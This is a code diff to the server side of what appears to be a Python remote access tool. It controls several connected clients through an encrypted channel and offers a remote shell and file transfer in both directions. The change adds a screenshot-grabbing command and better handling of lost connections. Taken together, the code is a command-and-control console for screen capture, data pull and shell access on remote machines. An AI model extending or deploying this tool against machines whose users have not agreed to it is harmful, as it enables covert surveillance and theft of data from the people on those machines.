@@ -5,6 +5,7 @@ import socket
 import sys
 import threading
 import time
+from datetime import datetime
 from queue import Queue
 
 from cryptography.fernet import Fernet
@@ -21,6 +22,7 @@ queue = Queue()
 interface_help = """
 --h | See this Help Message
 --e | Open a shell
+--g | Grabs a screenshot
 --u | User Info
 --s (file) | Transfers file to Client
 --r (file) | Transfers file to Server
@@ -126,7 +128,6 @@ class MultiServer(object):
             self.socket_bind()
         return
 
-
     def recvall(self, conn, n):
         """ Helper function to recv n bytes or return None if EOF is hit
         :param n:
@@ -140,8 +141,6 @@ class MultiServer(object):
                 return None
             data += packet
         return data
-
-
 
     def receive(self, conn, _print=True):
         """ Receive Buffer Size and Data from Client Encrypted with Connection Specific AES Key """
@@ -296,6 +295,14 @@ class MultiServer(object):
         print('File Transfer Successful')
         return
 
+    def screenshot(self, conn):
+        self.send(conn, b'<SCREENSHOT>')
+        data = self.receive(conn, _print=False)
+        with open('{}.png'.format(str(datetime.now()).replace(':','-')), 'wb') as f:
+            f.write(data)
+        print('Screenshot saved.')
+        return
+
     def shell(self, conn):
         """ Remote Shell with Client """
         self.send(conn, b'cd')
@@ -321,7 +328,6 @@ class MultiServer(object):
                 except UnicodeDecodeError:
                     print(output)
                 self.send(conn, b'<READY>')
-
 
     def interface(self, conn, target):
         """ CLI Interface to Client """
@@ -356,22 +362,30 @@ class MultiServer(object):
             if '--r' in command:
                 self.receive_file(conn)
                 continue
+            if '--g' in command:
+                self.screenshot(conn)
+                continue
             if '--h' in command:
                 print(interface_help)
+                continue
+            print("Invalid command: '--h' for help.")
 
     def turtle(self):
         """ Connection Selector """
         print("Type '--h' for help")
         while True:
-            command = input('> ')
-            if command == '--h':
-                print(turtle_help)
-            elif command == '--l':
-                self.list_connections()
-            elif '--i' in command:
-                target, conn = self.get_target(command)
-                if conn is not None:
-                    self.interface(conn, target)
+            try:
+                command = input('> ')
+                if command == '--h':
+                    print(turtle_help)
+                elif command == '--l':
+                    self.list_connections()
+                elif '--i' in command:
+                    target, conn = self.get_target(command)
+                    if conn is not None:
+                        self.interface(conn, target)
+            except:
+                print('Connection lost.')
 
 def create_workers():
     """ Create worker threads (will die when main exits) """
